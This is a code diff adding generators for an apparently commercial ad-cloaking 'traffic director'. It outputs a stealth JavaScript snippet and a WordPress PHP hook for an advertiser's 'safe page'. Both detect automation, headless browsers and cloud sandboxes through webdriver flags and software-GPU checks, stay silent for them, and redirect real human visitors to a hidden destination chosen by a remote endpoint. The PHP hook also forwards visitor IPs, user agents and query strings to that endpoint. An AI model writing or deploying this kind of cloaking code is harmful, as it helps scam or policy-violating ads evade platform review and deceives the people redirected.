@@ -161,6 +161,131 @@ export class ClientShieldGenerator {
   }
 
   /**
+   * Generates a stealth, zero-footprint JavaScript snippet for embedding in the <head>
+   * of an advertiser's self-hosted safe page on their own domain.
+   */
+  static generateSelfHostedPixelJs(config: { slug: string; apiBaseUrl: string; targetUrl?: string; fallbackUrl?: string }): string {
+    const { slug, apiBaseUrl } = config;
+    const safeBaseUrl = JSON.stringify(apiBaseUrl.replace(/\/+$/, ''));
+    const safeSlug = JSON.stringify(slug);
+
+    return `(function() {
+  'use strict';
+  try {
+    var bUrl = ${safeBaseUrl};
+    var s = ${safeSlug};
+    var ua = (navigator.userAgent || '').toLowerCase();
+    var isMobile = /iphone|ipad|ipod|android|mobile/.test(ua);
+    var tp = navigator.maxTouchPoints || 0;
+    var hasTouch = ('ontouchstart' in window) || (tp > 0);
+    var isWd = navigator.webdriver === true || !!window.__nightmare || !!window._phantom || !!window.callPhantom;
+
+    // Fast-path client heuristic check: Bot / Automation detected -> stay on safe page quietly
+    if (isWd || (isMobile && !hasTouch && tp === 0)) {
+      return;
+    }
+
+    // WebGL software renderer verification
+    var gpu = '';
+    try {
+      var cv = document.createElement('canvas');
+      var gl = cv.getContext('webgl') || cv.getContext('experimental-webgl');
+      if (gl) {
+        var dbg = gl.getExtension('WEBGL_debug_renderer_info');
+        if (dbg) {
+          gpu = (gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || '').toLowerCase();
+          if (gpu.indexOf('swiftshader') !== -1 || gpu.indexOf('llvmpipe') !== -1 || gpu.indexOf('software rasterizer') !== -1) {
+            return; // Bot / Cloud sandbox detected -> silent exit
+          }
+        }
+      }
+    } catch(e) {}
+
+    // Edge evaluation ping
+    var payload = {
+      touchPoints: tp,
+      gpuRenderer: gpu,
+      screenWidth: window.screen ? window.screen.width : 0,
+      screenHeight: window.screen ? window.screen.height : 0,
+      referrer: document.referrer || '',
+      url: window.location.href,
+      timezoneOffset: new Date().getTimezoneOffset()
+    };
+
+    fetch(bUrl + '/api/v1/traffic-director/evaluate/' + s, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    })
+    .then(function(res) { return res.json(); })
+    .then(function(data) {
+      if (data && data.success && data.route === 'target' && data.destinationUrl) {
+        try {
+          window.location.replace(data.destinationUrl);
+        } catch(err) {
+          window.location.href = data.destinationUrl;
+        }
+      }
+    })
+    .catch(function() {
+      // On network failure or adblocker interception, gracefully remain on safe page
+    });
+  } catch(fatal) {}
+})();`;
+  }
+
+  /**
+   * Generates a drop-in WordPress PHP hook snippet for server-side evaluation
+   */
+  static generateWordPressPhpSnippet(config: { slug: string; apiBaseUrl: string }): string {
+    const { slug, apiBaseUrl } = config;
+    return `<?php
+/**
+ * 180workspace Traffic Director - Server-Side Safe Page Hook
+ * Paste inside your active theme's functions.php or header.php
+ */
+add_action('template_redirect', function() {
+    if (is_admin() || wp_doing_ajax() || wp_doing_cron()) {
+        return;
+    }
+
+    $slug = '${slug}';
+    $api_endpoint = '${apiBaseUrl.replace(/\/+$/, '')}/api/v1/traffic-director/evaluate/' . $slug;
+
+    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] 
+        ?? $_SERVER['HTTP_X_FORWARDED_FOR'] 
+        ?? $_SERVER['REMOTE_ADDR'] 
+        ?? '';
+    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    $ref = $_SERVER['HTTP_REFERER'] ?? '';
+
+    $response = wp_remote_post($api_endpoint, [
+        'timeout'     => 1.2,
+        'redirection' => 0,
+        'httpversion' => '1.1',
+        'blocking'    => true,
+        'headers'     => ['Content-Type' => 'application/json'],
+        'body'        => json_encode([
+            'clientIp'    => $ip,
+            'userAgent'   => $ua,
+            'referrer'    => $ref,
+            'queryParams' => $_GET
+        ])
+    ]);
+
+    if (!is_wp_error($response)) {
+        $body = wp_remote_retrieve_body($response);
+        $data = json_decode($body, true);
+        if (!empty($data['route']) && $data['route'] === 'target' && !empty($data['destinationUrl'])) {
+            wp_redirect($data['destinationUrl'], 302);
+            exit;
+        }
+    }
+});
+?>`;
+  }
+
+  /**
    * Generates a pre-click embeddable dynamic ad script
    */
   static generateEmbedTagJs(config: EmbedTagConfig): string {
@@ -222,3 +347,4 @@ export class ClientShieldGenerator {
 })();`;
   }
 }
+
